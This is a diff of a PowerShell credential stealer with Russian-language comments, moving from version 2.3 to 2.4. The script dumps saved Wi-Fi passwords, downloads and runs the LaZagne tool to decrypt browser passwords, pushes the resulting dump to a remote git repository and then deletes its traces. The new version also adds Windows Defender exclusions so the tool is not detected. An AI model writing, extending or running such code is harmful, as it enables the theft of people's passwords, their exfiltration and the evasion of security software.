@@ -1,5 +1,5 @@
 # =============================================
-# WiFi + Browser Passwords v2.3 (с расшифровкой)
+# WiFi + Browser Passwords v2.4 (с исключением Defender)
 # =============================================
 
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -22,6 +22,16 @@ $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
 $filePath = Join-Path $exportDir "${hostname}_${timestamp}.txt"
 
 New-Item -ItemType Directory -Force -Path $exportDir | Out-Null
+
+# ====================== ИСКЛЮЧЕНИЕ WINDOWS DEFENDER ======================
+Write-Host "🛡️ Добавляем исключение в Windows Defender..." -ForegroundColor Yellow
+try {
+    Add-MpPreference -ExclusionPath $exportDir -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "lz.exe" -ErrorAction SilentlyContinue
+    Write-Host "✅ Исключение Defender добавлено" -ForegroundColor Green
+} catch {
+    Write-Host "⚠️ Не удалось добавить исключение Defender" -ForegroundColor Yellow
+}
 
 Write-Host "🔍 Извлекаем Wi-Fi и пароли браузеров..." -ForegroundColor Cyan
 
@@ -49,46 +59,39 @@ foreach ($p in $profiles) {
     $results += "----------------------------------------"
 }
 
-# ====================== BROWSER PASSWORDS (LaZagne) ======================
-Write-Host "🔓 Пытаемся расшифровать пароли браузеров..." -ForegroundColor Yellow
+# ====================== BROWSERS (LaZagne) ======================
+Write-Host "🔓 Расшифровываем пароли браузеров..." -ForegroundColor Yellow
 
 $browserResults = @()
 
 try {
-    # Скачиваем LaZagne (лёгкая portable версия)
     $lazagneUrl = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe"
     $lazagnePath = Join-Path $exportDir "lz.exe"
     
     Invoke-WebRequest -Uri $lazagneUrl -OutFile $lazagnePath -UseBasicParsing
 
-    # Запускаем LaZagne только для браузеров
     $output = & $lazagnePath browsers -quiet 2>$null
     
     if ($output) {
-        $browserResults += "=== BROWSER PASSWORDS (LaZagne) ==="
+        $browserResults += "=== BROWSER PASSWORDS ==="
         $browserResults += $output
-        $browserResults += "----------------------------------------"
     } else {
-        $browserResults += "LaZagne не нашёл сохранённых паролей или браузеры открыты."
+        $browserResults += "LaZagne: Пароли не найдены или браузеры открыты."
     }
 } catch {
-    $browserResults += "Ошибка при запуске LaZagne: $($_.Exception.Message)"
+    $browserResults += "Ошибка LaZagne: $($_.Exception.Message)"
 }
 
 $results += $browserResults
 
 [Console]::OutputEncoding = $oldEncoding
 
-# ====================== HEADER ======================
-$os = (Get-WmiObject Win32_OperatingSystem).Caption
-$username = $env:USERNAME
-
+# ====================== HEADER + SAVE ======================
 $header = @"
-FULL DUMP v2.3 - $hostname
+FULL DUMP v2.4 - $hostname
 ========================================
 Hostname     : $hostname
-Пользователь : $username
-Windows      : $os
+Пользователь : $env:USERNAME
 Дата         : $(Get-Date)
 WiFi паролей : $foundWiFi
 ========================================
@@ -96,9 +99,9 @@ WiFi паролей : $foundWiFi
 
 $header + ($results -join "`n") | Out-File -Encoding UTF8 -FilePath $filePath
 
-Write-Host "✅ Wi-Fi: $foundWiFi | Браузеры обработаны" -ForegroundColor Green
+Write-Host "✅ Готово! Wi-Fi: $foundWiFi" -ForegroundColor Green
 
-# ====================== PUSH ======================
+# ====================== PUSH TO GITHUB ======================
 try {
     $repoDir = Join-Path $exportDir "repo"
     if (!(Test-Path $repoDir)) { git clone $RepoUrl $repoDir }
@@ -115,6 +118,8 @@ try {
     Pop-Location
 }
 
-# ====================== АВТООЧИСТКА ======================
+# ====================== ФИНАЛЬНАЯ ОЧИСТКА ======================
+Write-Host "🧹 Очистка следов..." -ForegroundColor Gray
 Remove-Item $exportDir -Recurse -Force -ErrorAction SilentlyContinue
-Write-Host "🧹 Все следы удалены" -ForegroundColor Gray
+
+Write-Host "🎉 Операция завершена!" -ForegroundColor Green
